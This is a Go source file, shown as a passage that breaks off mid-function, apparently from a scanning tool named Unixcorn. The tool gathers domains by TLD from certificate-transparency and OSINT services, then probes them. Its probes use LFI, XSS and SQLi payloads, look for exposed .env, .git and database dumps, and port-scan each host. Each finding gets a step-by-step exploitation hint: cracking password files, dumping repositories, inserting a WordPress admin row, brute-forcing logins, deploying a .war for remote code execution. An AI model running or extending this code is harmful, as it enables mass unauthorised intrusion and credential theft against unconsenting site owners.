package api

import (
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"
	"unixcorn/daemon/internal/db"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
)

type FindRequest struct {
	Category  string   `json:"category"`
	TLDs      []string `json:"tlds"`
	VulnTypes []string `json:"vuln_types"`
}

type TargetFinding struct {
	Type        string   `json:"type"`        // vuln_type: backup, admin, dir, login, cms, sqli, xss, lfi, headers
	Severity    string   `json:"severity"`    // critical, high, medium, low, info
	Path        string   `json:"path"`        // /admin/, /.env, etc.
	StatusCode  int      `json:"status_code"`
	Title       string   `json:"title"`       // short label
	Evidence    string   `json:"evidence"`    // matched snippet
	Description string   `json:"description"` // human explanation
	URL         string   `json:"url"`         // full URL
	CVEs        []string `json:"cves"`        // related CVE IDs
	Nuclei      string   `json:"nuclei"`      // nuclei-template ID
	References  []string `json:"references"`  // external URLs (cve.org search, exploit-db, etc.)
	ExploitHint string   `json:"exploit_hint"`// one-line: what to try next
}

// ProbeTest records every path attempted (hit OR miss) so user sees full work.
type ProbeTest struct {
	Type       string `json:"type"`
	Path       string `json:"path"`
	StatusCode int    `json:"status_code"`
	Outcome    string `json:"outcome"`   // "hit" | "miss-marker" | "404" | "403" | "error" | "redirect"
	Note       string `json:"note"`      // why-this-outcome detail
	Matched    string `json:"matched"`   // marker matched (empty if not)
	DurationMS int64  `json:"ms"`
}

type FoundTarget struct {
	Domain        string            `json:"domain"`
	Category      string            `json:"category"`
	Indicator     string            `json:"indicator"`
	Source        string            `json:"source"`
	Status        string            `json:"status"`
	StatusCode    int               `json:"status_code"`
	Title         string            `json:"title"`
	Tech          string            `json:"tech"`
	IP            string            `json:"ip"`
	FinalURL      string            `json:"final_url"`
	Findings      []TargetFinding   `json:"findings"`
	Headers       map[string]string `json:"headers"`
	DorkHits      []string          `json:"dork_hits"`
	OpenPorts     []int             `json:"open_ports"`
	Tests         []ProbeTest       `json:"tests"`
	OfflineReason string            `json:"offline_reason"`
	MatchReason   string            `json:"match_reason"`
}

type crtEntry struct {
	NameValue string `json:"name_value"`
}

var osintClient = &http.Client{Timeout: 8 * time.Second}
var titleRe = regexp.MustCompile(`(?i)<title[^>]*>([^<]{1,200})`)

var techPatterns = []struct {
	name    string
	pattern string
}{
	{"WordPress", "wp-content"},
	{"WordPress", "wp-includes"},
	{"Joomla", "/components/com_"},
	{"Joomla", "joomla"},
	{"Drupal", "Drupal.settings"},
	{"Laravel", "laravel_session"},
	{"Laravel", "XSRF-TOKEN"},
	{"CodeIgniter", "ci_session"},
	{"jQuery", "jquery"},
	{"Bootstrap", "bootstrap"},
	{"React", "__NEXT_DATA__"},
	{"Vue", "vue.js"},
}

var probeClient = &http.Client{
	Timeout: 7 * time.Second,
	CheckRedirect: func(req *http.Request, via []*http.Request) error {
		if len(via) >= 5 {
			return http.ErrUseLastResponse
		}
		return nil
	},
}

var deepProbeClient = &http.Client{
	Timeout: 5 * time.Second,
	CheckRedirect: func(req *http.Request, via []*http.Request) error {
		if len(via) >= 2 {
			return http.ErrUseLastResponse
		}
		return nil
	},
}

// vulnProbes maps each user-selectable vuln type to a list of probe paths + match rules.
var vulnProbes = map[string][]struct {
	Path     string
	Markers  []string
	Severity string
	Title    string
	Desc     string
}{
	"backup": {
		{"/.env", []string{"DB_PASSWORD", "APP_KEY", "DB_HOST", "DB_USERNAME"}, "critical", "Exposed .env", "Environment file with DB credentials publicly accessible."},
		{"/.env.local", []string{"DB_PASSWORD", "APP_KEY"}, "critical", "Exposed .env.local", "Local Laravel environment file accessible."},
		{"/.env.production", []string{"DB_PASSWORD", "APP_KEY"}, "critical", "Exposed .env.production", "Production environment file accessible."},
		{"/.git/config", []string{"[core]", "repositoryformatversion"}, "critical", ".git/config exposed", "Git repository configuration accessible — full repo dump possible."},
		{"/.git/HEAD", []string{"ref:"}, "critical", ".git/HEAD exposed", "Git HEAD accessible — repo source disclosure."},
		{"/wp-config.php.bak", []string{"DB_NAME", "DB_PASSWORD", "<?php"}, "critical", "WP config backup", "WordPress config backup contains DB credentials."},
		{"/wp-config.php.old", []string{"DB_NAME", "DB_PASSWORD"}, "critical", "WP config backup", "WordPress config backup exposed."},
		{"/wp-config.php~", []string{"DB_NAME", "DB_PASSWORD"}, "critical", "WP config backup", "WordPress config backup exposed."},
		{"/config.php.bak", []string{"<?php", "password", "DB_"}, "critical", "Config backup", "Config backup file accessible."},
		{"/configuration.php.bak", []string{"<?php", "$db", "$password"}, "critical", "Joomla config backup", "Joomla configuration backup exposed."},
		{"/.htpasswd", []string{":"}, "high", ".htpasswd exposed", "Apache basic-auth password file accessible."},
		{"/backup.sql", []string{"INSERT INTO", "CREATE TABLE"}, "critical", "SQL dump exposed", "Database backup SQL accessible."},
		{"/dump.sql", []string{"INSERT INTO", "CREATE TABLE"}, "critical", "SQL dump exposed", "Database dump accessible."},
		{"/database.sql", []string{"INSERT INTO", "CREATE TABLE"}, "critical", "SQL dump exposed", "Database file accessible."},
		{"/db_backup.sql", []string{"INSERT INTO"}, "critical", "DB backup", "Database backup SQL accessible."},
		{"/backup.zip", []string{"PK"}, "high", "ZIP backup", "Backup archive accessible (responds with ZIP signature)."},
		{"/.DS_Store", []string{"\x00\x00\x00\x01Bud1"}, "low", ".DS_Store exposed", "macOS metadata file leaks directory layout."},
		{"/composer.json", []string{"\"require\"", "\"name\""}, "medium", "composer.json exposed", "PHP dependency manifest accessible — fingerprints stack."},
		{"/package.json", []string{"\"dependencies\"", "\"name\""}, "low", "package.json exposed", "Node dependency manifest accessible."},
	},
	"admin": {
		{"/admin/", []string{"login", "password", "username", "admin"}, "medium", "Admin panel", "Admin login interface accessible."},
		{"/administrator/", []string{"joomla", "username", "passwd"}, "medium", "Joomla admin", "Joomla administrator panel."},
		{"/wp-admin/", []string{"WordPress", "wp-login"}, "medium", "WP admin", "WordPress admin redirect/login page."},
		{"/wp-login.php", []string{"wordpress", "user_login"}, "medium", "WP login", "WordPress login page accessible."},
		{"/phpmyadmin/", []string{"phpMyAdmin", "pma_login"}, "high", "phpMyAdmin", "phpMyAdmin DB interface accessible."},
		{"/pma/", []string{"phpMyAdmin"}, "high", "phpMyAdmin", "phpMyAdmin alias accessible."},
		{"/adminer.php", []string{"Adminer"}, "high", "Adminer", "Adminer DB tool accessible."},
		{"/cpanel/", []string{"cPanel"}, "low", "cPanel link", "cPanel reference accessible."},
		{"/manager/html", []string{"Tomcat", "Manager"}, "high", "Tomcat manager", "Apache Tomcat manager interface."},
	},
	"dir": {
		{"/uploads/", []string{"Index of", "Parent Directory"}, "high", "Open dir listing", "Directory listing enabled on /uploads/."},
		{"/files/", []string{"Index of", "Parent Directory"}, "high", "Open dir listing", "Directory listing enabled on /files/."},
		{"/backup/", []string{"Index of", "Parent Directory"}, "high", "Open dir listing", "Directory listing on /backup/."},
		{"/temp/", []string{"Index of", "Parent Directory"}, "medium", "Open dir listing", "Directory listing on /temp/."},
		{"/.git/", []string{"Index of", "objects/"}, "critical", ".git directory listing", "Full Git repo dumpable."},
		{"/vendor/", []string{"Index of"}, "medium", "Vendor dir listing", "PHP vendor directory listing."},
		{"/node_modules/", []string{"Index of"}, "low", "node_modules listing", "Node modules directory listing."},
	},
	"login": {
		{"/login", []string{"password", "username", "<form"}, "info", "Login page", "Public login interface."},
		{"/signin", []string{"password", "<form"}, "info", "Sign-in page", "Sign-in interface."},
		{"/auth/login", []string{"password", "<form"}, "info", "Auth login", "Auth endpoint."},
	},
	"cms": {
		{"/readme.html", []string{"WordPress", "Version"}, "low", "WP version disclosure", "WordPress readme.html reveals version."},
		{"/CHANGELOG.txt", []string{"Drupal"}, "low", "Drupal version disclosure", "Drupal CHANGELOG accessible."},
		{"/license.txt", []string{"WordPress"}, "info", "WP license", "WordPress license file."},
		{"/wp-json/wp/v2/users", []string{"\"id\":", "\"name\":", "\"slug\":"}, "high", "WP user enum (REST)", "WordPress REST API exposes user list."},
		{"/_ignition/health-check", []string{"healthy", "Ignition"}, "critical", "Laravel Ignition", "Laravel Ignition exposed — CVE-2021-3129 candidate."},
		{"/telescope", []string{"Telescope", "Laravel"}, "critical", "Laravel Telescope", "Telescope dashboard exposed — full request/query log."},
		{"/_profiler", []string{"Profiler", "Symfony"}, "critical", "Symfony Profiler", "Symfony profiler exposed."},
		{"/server-status", []string{"Apache Server Status"}, "medium", "Apache status", "Apache server-status accessible."},
		{"/phpinfo.php", []string{"PHP Version", "phpinfo()"}, "critical", "phpinfo()", "PHP configuration page exposed."},
		{"/info.php", []string{"PHP Version"}, "critical", "phpinfo()", "PHP info page exposed."},
	},
	"upload": {
		{"/upload.php", []string{"<form", "enctype", "file"}, "medium", "Upload endpoint", "File upload form accessible."},
		{"/fileupload/", []string{"<form", "file"}, "medium", "Upload endpoint", "File upload directory."},
		{"/file-manager/", []string{"file", "manager"}, "high", "File manager", "File manager accessible."},
	},
	// surface checks — flag URLs that have query-string params suitable for the vuln class
	"sqli": {
		{"/?id=1", []string{"SQL syntax", "mysql_fetch", "ORA-", "PDOException", "MariaDB"}, "high", "SQL error reflected", "Single quote in id parameter leaks DB error."},
	},
	"lfi": {
		{"/?page=../../../../etc/passwd", []string{"root:x:", "daemon:"}, "critical", "LFI confirmed", "Path-traversal payload reads /etc/passwd."},
		{"/?file=../../../../etc/passwd", []string{"root:x:", "daemon:"}, "critical", "LFI confirmed", "/etc/passwd readable via file parameter."},
	},
	"xss": {
		{"/?q=<script>alert(1)</script>", []string{"<script>alert(1)</script>"}, "high", "Reflected XSS surface", "Search parameter reflects unsanitized HTML."},
	},
}

// pathIntel — per-path CVE / nuclei-template / exploit-hint enrichment.
type pathIntel struct {
	CVEs     []string
	Nuclei   string
	Hint     string
	RefURLs  []string
}

var pathIntelMap = map[string]pathIntel{
	"/.env":            {Nuclei: "exposures/configs/dotenv-config-file", Hint: "Pull DB_*, APP_KEY → forge sessions / connect DB directly.", RefURLs: []string{"https://github.com/projectdiscovery/nuclei-templates/blob/main/http/exposures/configs/dotenv-config-file.yaml"}},
	"/.env.local":      {Nuclei: "exposures/configs/dotenv-config-file", Hint: "Same as .env — Laravel local override often has prod creds."},
	"/.env.production": {Nuclei: "exposures/configs/dotenv-config-file", Hint: "Production credentials. Test DB host from leaked DB_HOST."},
	"/.git/config":     {Nuclei: "exposures/configs/git-config", Hint: "Run `git-dumper https://target/.git/ out/` then `git log -p` to extract source + secrets.", RefURLs: []string{"https://github.com/arthaud/git-dumper"}},
	"/.git/HEAD":       {Nuclei: "exposures/files/git-head", Hint: "Confirm /.git/ exposed → git-dumper for full repo."},
	"/wp-config.php.bak":   {Nuclei: "exposures/backups/wp-config-bak", CVEs: []string{}, Hint: "DB_NAME/USER/PASSWORD → connect to wp DB → INSERT admin row.", RefURLs: []string{"https://wpscan.com/"}},
	"/wp-config.php.old":   {Nuclei: "exposures/backups/wp-config-bak", Hint: "Same as .bak — direct DB takeover."},
	"/wp-config.php~":      {Nuclei: "exposures/backups/wp-config-bak", Hint: "Same — vim/nano left over backup."},
	"/config.php.bak":      {Hint: "Inspect for DB connection block + admin hashes."},
	"/configuration.php.bak": {Hint: "Joomla config → $user/$password → MySQL takeover."},
	"/.htpasswd":         {Nuclei: "exposures/configs/htpasswd-config", Hint: "Run `john --wordlist=rockyou.txt .htpasswd` to crack bcrypt/MD5-crypt."},
	"/backup.sql":        {Hint: "Grep dump for INSERT INTO users / hashes. Crack with hashcat -m 0/100/1400."},
	"/dump.sql":          {Hint: "Grep INSERT INTO sessions / users."},
	"/database.sql":      {Hint: "Same — full DB dump."},
	"/db_backup.sql":     {Hint: "Same."},
	"/backup.zip":        {Hint: "Unzip locally; grep -r 'password' ."},
	"/.DS_Store":         {Nuclei: "exposures/files/ds-store-file", Hint: "Parse with `ds_store_exp` to enum directory contents."},
	"/composer.json":     {Hint: "Read `require` block to fingerprint vendor lib versions → search CVEs per package."},
	"/package.json":      {Hint: "Read `dependencies` for npm package versions."},

	"/admin/":             {Nuclei: "default-logins/", Hint: "Try admin:admin, admin:password, admin:admin123. Then sqlmap on login params.", RefURLs: []string{"https://github.com/danielmiessler/SecLists/tree/master/Passwords"}},
	"/administrator/":     {Nuclei: "technologies/joomla-detect", CVEs: []string{"CVE-2023-23752"}, Hint: "Joomla 4.0.0-4.2.7 unauth API leak: `/api/index.php/v1/config/application?public=true`.", RefURLs: []string{"https://www.cve.org/CVERecord?id=CVE-2023-23752"}},
	"/wp-admin/":          {Nuclei: "technologies/wordpress-detect", Hint: "Try xmlrpc.php brute, REST user enum, default WP creds."},
	"/wp-login.php":       {Nuclei: "default-logins/wordpress/wordpress-default-login", Hint: "Brute with wpscan: `wpscan --url X --usernames admin --passwords rockyou.txt`."},
	"/phpmyadmin/":        {Nuclei: "default-logins/phpmyadmin/phpmyadmin-default-login", CVEs: []string{"CVE-2018-12613", "CVE-2016-5734"}, Hint: "Try root/root, root/empty. LFI via target=... (CVE-2018-12613).", RefURLs: []string{"https://www.cve.org/CVERecord?id=CVE-2018-12613"}},
	"/pma/":               {Nuclei: "default-logins/phpmyadmin/phpmyadmin-default-login", Hint: "Same as /phpmyadmin/."},
	"/adminer.php":        {CVEs: []string{"CVE-2021-43008", "CVE-2020-35572"}, Nuclei: "exposures/panels/adminer-panel", Hint: "SSRF via login → connect to internal MySQL. Or upload malicious driver.", RefURLs: []string{"https://www.cve.org/CVERecord?id=CVE-2021-43008"}},
	"/cpanel/":            {Hint: "cPanel doc link — pivot to https://target:2083/ login. Try default-creds list."},
	"/manager/html":       {CVEs: []string{"CVE-2017-12617", "CVE-2020-1938"}, Nuclei: "default-logins/tomcat/tomcat-default-login", Hint: "Try tomcat/tomcat, admin/admin. Then deploy .war for RCE.", RefURLs: []string{"https://www.cve.org/CVERecord?id=CVE-2017-12617"}},

	"/uploads/":      {Nuclei: "exposures/configs/apache-config", Hint: "Browse for sensitive uploaded files (PDFs, backups, KTP scans)."},
	"/files/":        {Hint: "Same — sensitive document leak."},
	"/backup/":       {Hint: "Look for .sql, .zip, .tar.gz dumps."},
	"/temp/":         {Hint: "Often contains active session files or partial uploads."},
	"/.git/":         {Nuclei: "exposures/configs/git-config", Hint: "git-dumper https://target/.git/ ./repo"},
	"/vendor/":       {Nuclei: "exposures/files/vendor-folder", Hint: "Browse for vendor lib README → fingerprint version → CVE search."},
	"/node_modules/": {Hint: "Browse for package versions → npm audit equivalent."},

	"/login":      {Hint: "Test default creds, SQLi (' OR 1=1--), user enum via response diff."},
	"/signin":     {Hint: "Same — default creds + SQLi probe."},
	"/auth/login": {Hint: "Same."},

	"/readme.html":   {Nuclei: "technologies/wordpress-detect", Hint: "Extract WordPress version → `wpscan --url X --enumerate vp` for vulnerable plugins."},
	"/CHANGELOG.txt": {CVEs: []string{"CVE-2018-7600", "CVE-2019-6340"}, Nuclei: "vulnerabilities/drupal/drupal-rce", Hint: "Drupal version → if <7.58/<8.5.1: Drupalgeddon 2 RCE.", RefURLs: []string{"https://www.cve.org/CVERecord?id=CVE-2018-7600"}},
	"/license.txt":   {Hint: "WP license — confirms WordPress install."},
	"/wp-json/wp/v2/users": {CVEs: []string{"CVE-2017-5487"}, Nuclei: "vulnerabilities/wordpress/wordpress-user-enumeration", Hint: "Enumerate usernames → brute /wp-login.php.", RefURLs: []string{"https://www.cve.org/CVERecord?id=CVE-2017-5487"}},
	"/_ignition/health-check": {CVEs: []string{"CVE-2021-3129"}, Nuclei: "vulnerabilities/laravel/laravel-ignition-debug-rce", Hint: "If Laravel <8.4.2 + debug=true → unauth RCE via phar://.", RefURLs: []string{"https://www.cve.org/CVERecord?id=CVE-2021-3129"}},
	"/telescope":     {Nuclei: "exposures/panels/laravel-telescope", Hint: "Browse /telescope/queries → DB queries with bound values (often credentials)."},
	"/_profiler":     {Nuclei: "exposures/panels/symfony-profiler", Hint: "Symfony profiler → /_profiler/phpinfo, /_profiler/latest. Env vars + DB queries exposed."},
	"/server-status": {Nuclei: "exposures/apache/apache-server-status", Hint: "Monitor live requests with creds in URLs. `while true; do curl -s X/server-status; sleep 1; done`."},
	"/phpinfo.php":   {Nuclei: "exposures/files/phpinfo-files", Hint: "Extract env vars (DB_*, secrets), php.ini config, disable_functions list."},
	"/info.php":      {Nuclei: "exposures/files/phpinfo-files", Hint: "Same as /phpinfo.php."},

	"/upload.php":     {Hint: "Test ext bypass: shell.php.jpg, shell.phtml, .htaccess upload. Check magic-byte filter."},
	"/fileupload/":    {Hint: "Same upload bypass tests."},
	"/file-manager/":  {Nuclei: "vulnerabilities/wordpress/wp-file-manager-rce", CVEs: []string{"CVE-2020-25213"}, Hint: "WP File Manager <6.9 RCE via elFinder connector.", RefURLs: []string{"https://www.cve.org/CVERecord?id=CVE-2020-25213"}},

	"/?id=1":                  {Nuclei: "vulnerabilities/generic/sql-injection-error-based", Hint: "Run `sqlmap -u X --batch --dbs --threads=10`."},
	"/?page=../../../../etc/passwd": {Nuclei: "vulnerabilities/generic/lfi-detection", Hint: "Escalate via /proc/self/environ poisoning + UA shell injection."},
	"/?file=../../../../etc/passwd": {Nuclei: "vulnerabilities/generic/lfi-detection", Hint: "PHP filter chain: php://filter/convert.base64-encode/resource=index.php"},
	"/?q=<script>alert(1)</script>": {Nuclei: "vulnerabilities/generic/xss-reflected", Hint: "Bypass WAF: try <svg/onload=>, polyglot payloads, encoded variants."},
}

// enrichFinding fills in CVE / template / references for a finding based on its path + tech.
func enrichFinding(f *TargetFinding, tech []string) {
	if intel, ok := pathIntelMap[f.Path]; ok {
		f.CVEs = intel.CVEs
		f.Nuclei = intel.Nuclei
		f.ExploitHint = intel.Hint
		f.References = intel.RefURLs
	}
	// Always add a cve.org search link
	q := url.QueryEscape(strings.TrimPrefix(strings.TrimSuffix(f.Path, "/"), "/"))
	if q == "" {
		q = url.QueryEscape(f.Title)
	}
	f.References = append(f.References,
		fmt.Sprintf("https://www.cve.org/CVERecord/SearchResults?query=%s", q),
		fmt.Sprintf("https://www.exploit-db.com/search?q=%s", q),
	)
	if f.Nuclei != "" {
		f.References = append(f.References,
			fmt.Sprintf("https://github.com/projectdiscovery/nuclei-templates/tree/main/http/%s", f.Nuclei),
		)
	}
	// Tech-based hint additions
	for _, t := range tech {
		switch strings.ToLower(t) {
		case "wordpress":
			if !contains(f.CVEs, "CVE-2017-5487") && f.Type == "cms" {
				f.CVEs = append(f.CVEs, "CVE-2017-5487")
			}
		case "joomla":
			if !contains(f.CVEs, "CVE-2023-23752") {
				f.CVEs = append(f.CVEs, "CVE-2023-23752")
			}
		case "drupal":
			f.CVEs = append(f.CVEs, "CVE-2018-7600", "CVE-2019-6340")
		case "laravel":
			f.CVEs = append(f.CVEs, "CVE-2021-3129")
		}
	}
}

func contains(arr []string, s string) bool {
	for _, a := range arr {
		if a == s {
			return true
		}
	}
	return false
}

// runVulnProbe runs the path checks for selected vuln types in parallel and returns
// findings (real hits) AND all attempted tests (hit + miss) so the UI can show full work.
func runVulnProbe(baseURL string, vulnTypes []string, tech []string) ([]TargetFinding, []ProbeTest) {
	type probe struct {
		vt      string
		path    string
		markers []string
		sev     string
		title   string
		desc    string
	}
	var probes []probe
	for _, vt := range vulnTypes {
		ps, ok := vulnProbes[vt]
		if !ok {
			continue
		}
		for _, p := range ps {
			probes = append(probes, probe{vt, p.Path, p.Markers, p.Severity, p.Title, p.Desc})
		}
	}
	if len(probes) == 0 {
		return nil, nil
	}

	type result struct {
		finding *TargetFinding
		test    ProbeTest
	}
	resCh := make(chan result, len(probes))
	sem := make(chan struct{}, 6)
	var wg sync.WaitGroup
	for _, p := range probes {
		wg.Add(1)
		go func(p probe) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			start := time.Now()
			fullURL := strings.TrimRight(baseURL, "/") + p.path
			test := ProbeTest{Type: p.vt, Path: p.path}

			req, err := http.NewRequest("GET", fullURL, nil)
			if err != nil {
				test.Outcome = "error"
				test.Note = err.Error()
				test.DurationMS = time.Since(start).Milliseconds()
				resCh <- result{nil, test}
				return
			}
			req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; Unixcorn/1.0)")
			resp, err := deepProbeClient.Do(req)
			test.DurationMS = time.Since(start).Milliseconds()
			if err != nil {
				test.Outcome = "error"
				test.Note = strings.TrimPrefix(err.Error(), "Get \""+fullURL+"\": ")
				resCh <- result{nil, test}
				return
			}
			defer resp.Body.Close()
			test.StatusCode = resp.StatusCode

			if resp.StatusCode == 404 {
				test.Outcome = "404"
				test.Note = "path not present on server"
				resCh <- result{nil, test}
				return
			}
			if resp.StatusCode == 403 {
				test.Outcome = "403"
				test.Note = "path forbidden — may exist but is access-controlled"
				resCh <- result{nil, test}
				return
			}
			if resp.StatusCode >= 300 && resp.StatusCode < 400 {
				test.Outcome = "redirect"
				test.Note = "redirected to " + resp.Header.Get("Location")
				resCh <- result{nil, test}
				return
			}

			body := make([]byte, 32*1024)
			n, _ := io.ReadFull(resp.Body, body)
			if n <= 0 {
				test.Outcome = "miss-empty"
				test.Note = "empty body"
				resCh <- result{nil, test}
				return
			}
			text := string(body[:n])
			lowerText := strings.ToLower(text)
			matched := ""
			for _, m := range p.markers {
				if strings.Contains(lowerText, strings.ToLower(m)) {
					matched = m
					break
				}
			}
			if matched == "" && (p.sev == "info" || p.sev == "medium") && resp.StatusCode == 200 {
				if strings.Contains(lowerText, "<form") {
					matched = "<form (login form rendered)"
				}
			}
			if matched == "" {
				test.Outcome = "miss-marker"
				test.Note = fmt.Sprintf("path reachable (HTTP %d, %d bytes) but none of %d markers matched",
					resp.StatusCode, n, len(p.markers))
				resCh <- result{nil, test}
				return
			}

			snippet := text
			if idx := strings.Index(strings.ToLower(snippet), strings.ToLower(matched)); idx > 0 {
				s := idx - 40
				if s < 0 {
					s = 0
				}
				e := idx + len(matched) + 200
				if e > len(snippet) {
					e = len(snippet)
				}
				snippet = snippet[s:e]
			}
			if len(snippet) > 400 {
				snippet = snippet[:400]
			}
			test.Outcome = "hit"
			test.Note = fmt.Sprintf("marker %q matched in response body", matched)
			test.Matched = matched
			f := TargetFinding{
				Type: p.vt, Severity: p.sev, Path: p.path,
				StatusCode: resp.StatusCode, Title: p.title,
				Evidence: strings.TrimSpace(snippet), Description: p.desc,
				URL: fullURL,
			}
			resCh <- result{&f, test}
		}(p)
	}
	wg.Wait()
	close(resCh)
	var findings []TargetFinding
	var tests []ProbeTest
	for r := range resCh {
		tests = append(tests, r.test)
		if r.finding != nil {
			findings = append(findings, *r.finding)
		}
	}
	return findings, tests
}

// portScan — quick TCP connect to top web ports
func portScan(host string) []int {
	ports := []int{80, 443, 8080, 8443, 8000, 8888, 21, 22, 25, 53, 110, 143,
		2082, 2083, 2087, 3000, 3306, 5432, 5900, 6379, 8081, 9000, 9090, 9200, 27017}
	openCh := make(chan int, len(ports))
	sem := make(chan struct{}, 12)
	var wg sync.WaitGroup
	for _, p := range ports {
		wg.Add(1)
		go func(port int) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()
			conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), 1500*time.Millisecond)
			if err == nil {
				conn.Close()
				openCh <- port
			}
		}(p)
	}
	wg.Wait()
	close(openCh)
	var open []int
	for p := range openCh {
		open = append(open, p)
	}
	return open
}

// checkSecurityHeaders returns findings for missing critical security headers.
func checkSecurityHeaders(h http.Header) []TargetFinding {
	required := []struct{ name, severity, desc string }{
		{"Content-Security-Policy", "medium", "No CSP — XSS mitigations weakened."},
		{"Strict-Transport-Security", "medium", "No HSTS — protocol downgrade possible."},
		{"X-Frame-Options", "low", "No X-Frame-Options — clickjacking risk."},
		{"X-Content-Type-Options", "low", "No X-Content-Type-Options — MIME sniffing risk."},
	}
	var findings []TargetFinding
	for _, r := range required {
		if h.Get(r.name) == "" {
			findings = append(findings, TargetFinding{
				Type:        "headers",
				Severity:    r.severity,
				Path:        "/",
				Title:       "Missing " + r.name,
				Description: r.desc,
			})
		}
	}
	// CORS wildcard
	if h.Get("Access-Control-Allow-Origin") == "*" {
		findings = append(findings, TargetFinding{
			Type:        "headers",
			Severity:    "medium",
			Path:        "/",
			Title:       "CORS wildcard",
			Description: "Access-Control-Allow-Origin: * — any origin can read responses.",
			Evidence:    "Access-Control-Allow-Origin: *",
		})
	}
	return findings
}

type probeInfo struct {
	alive         bool
	statusCode    int
	server        string
	powered       string
	title         string
	tech          []string
	ip            string
	finalURL      string
	headers       map[string]string
	findings      []TargetFinding
	openPorts     []int
	tests         []ProbeTest
	offlineReason string
}

func probeTarget(domain string, vulnTypes []string) probeInfo {
	addrs, dnsErr := net.LookupHost(domain)
	ip := ""
	if len(addrs) > 0 {
		ip = addrs[0]
	}
	if dnsErr != nil && ip == "" {
		return probeInfo{offlineReason: "DNS lookup failed: " + dnsErr.Error()}
	}

	var lastErr error
	for _, scheme := range []string{"https", "http"} {
		reqURL := fmt.Sprintf("%s://%s", scheme, domain)
		req, err := http.NewRequest("GET", reqURL, nil)
		if err != nil {
			lastErr = err
			continue
		}
		req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; Unixcorn/1.0)")
		resp, err := probeClient.Do(req)
		if err != nil {
			lastErr = err
			continue
		}

		body := make([]byte, 65536)
		n, _ := resp.Body.Read(body)
		resp.Body.Close()
		bodyStr := string(body[:n])

		hdrs := map[string]string{}
		for _, k := range []string{"Server", "X-Powered-By", "Content-Type", "Set-Cookie",
			"Strict-Transport-Security", "Content-Security-Policy", "X-Frame-Options",
			"X-Content-Type-Options", "Access-Control-Allow-Origin", "X-Generator"} {
			if v := resp.Header.Get(k); v != "" {
				hdrs[k] = v
			}
		}

		info := probeInfo{
			alive:      true,
			statusCode: resp.StatusCode,
			server:     resp.Header.Get("Server"),
			powered:    resp.Header.Get("X-Powered-By"),
			ip:         ip,
			finalURL:   resp.Request.URL.String(),
			headers:    hdrs,
		}

		if m := titleRe.FindStringSubmatch(bodyStr); len(m) > 1 {
			info.title = strings.TrimSpace(m[1])
		}

		seen := map[string]bool{}
		bodyLower := strings.ToLower(bodyStr)
		for _, p := range techPatterns {
			if !seen[p.name] && strings.Contains(bodyLower, strings.ToLower(p.pattern)) {
				seen[p.name] = true
				info.tech = append(info.tech, p.name)
			}
		}
		if info.server != "" && !seen[info.server] {
			info.tech = append(info.tech, info.server)
		}
		if info.powered != "" && !seen[info.powered] {
			info.tech = append(info.tech, info.powered)
		}

		// Deep vuln probes
		base := info.finalURL
		if base == "" {
			base = reqURL
		}
		findings, tests := runVulnProbe(base, vulnTypes, info.tech)
		// Enrich each finding with CVE / nuclei-template / refs
		for i := range findings {
			enrichFinding(&findings[i], info.tech)
		}
		info.findings = findings
		info.tests = tests
		// Security-header findings (no path-based enrichment)
		hdrFindings := checkSecurityHeaders(resp.Header)
		for i := range hdrFindings {
			enrichFinding(&hdrFindings[i], info.tech)
		}
		info.findings = append(info.findings, hdrFindings...)

		// Port scan
		if ip != "" {
			info.openPorts = portScan(ip)
		}

		return info
	}
	reason := "no HTTP response on https/http"
	if lastErr != nil {
		reason = "connection failed: " + lastErr.Error()
	}
	return probeInfo{ip: ip, offlineReason: reason}
}

func queryCrtSh(tld string) ([]string, string, error) {
	query := strings.ReplaceAll(tld, "*", "%")
	reqURL := fmt.Sprintf("https://crt.sh/?q=%s&output=json", url.QueryEscape(query))

	resp, err := osintClient.Get(reqURL)
	if err != nil {
		return nil, "crt.sh", fmt.Errorf("crt.sh unreachable: %w", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil, "crt.sh", fmt.Errorf("crt.sh HTTP %d", resp.StatusCode)
	}
	body, _ := io.ReadAll(resp.Body)
	var entries []crtEntry
	if err := json.Unmarshal(body, &entries); err != nil {
		return nil, "crt.sh", fmt.Errorf("crt.sh bad JSON: %w", err)
	}
	seen := map[string]bool{}
	var out []string
	for _, e := range entries {
		for _, d := range strings.Split(e.NameValue, "\n") {
			d = strings.TrimSpace(strings.TrimPrefix(d, "*."))
			if d != "" && !seen[d] && !strings.Contains(d, " ") {
				seen[d] = true
				out = append(out, d)
			}
		}
	}
	return out, "crt.sh", nil
}

func queryHackerTarget(tld string) ([]string, string, error) {
	clean := strings.ReplaceAll(tld, "*.", "")
	reqURL := fmt.Sprintf("https://api.hackertarget.com/hostsearch/?q=%s", url.QueryEscape(clean))

	resp, err := osintClient.Get(reqURL)
	if err != nil {
		return nil, "hackertarget", fmt.Errorf("hackertarget unreachable: %w", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil, "hackertarget", fmt.Errorf("hackertarget HTTP %d", resp.StatusCode)
	}
	body, _ := io.ReadAll(resp.Body)
	text := strings.TrimSpace(string(body))
	firstLine := strings.SplitN(text, "\n", 2)[0]
	if !strings.Contains(firstLine, ",") {
		return nil, "hackertarget", fmt.Errorf("hackertarget: %s", firstLine)
	}
	seen := map[string]bool{}
	var out []string
	for _, line := range strings.Split(text, "\n") {
		parts := strings.SplitN(line, ",", 2)
		if len(parts) < 1 {
			continue
		}
		d := strings.TrimSpace(parts[0])
		if d != "" && !seen[d] && strings.HasSuffix(d, clean) {
			seen[d] = true
			out = append(out, d)
		}
	}
	return out, "hackertarget", nil
}

func queryCertspotter(tld string) ([]string, string, error) {
	clean := strings.ReplaceAll(tld, "*.", "")
	reqURL := fmt.Sprintf(
		"https://api.certspotter.com/v1/issuances?domain=%s&expand=dns_names&include_subdomains=true",
		url.QueryEscape(clean),
	)

	client := &http.Client{Timeout: 15 * time.Second}
	resp, err := client.Get(reqURL)
	if err != nil {
		return nil, "certspotter", fmt.Errorf("certspotter unreachable: %w", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
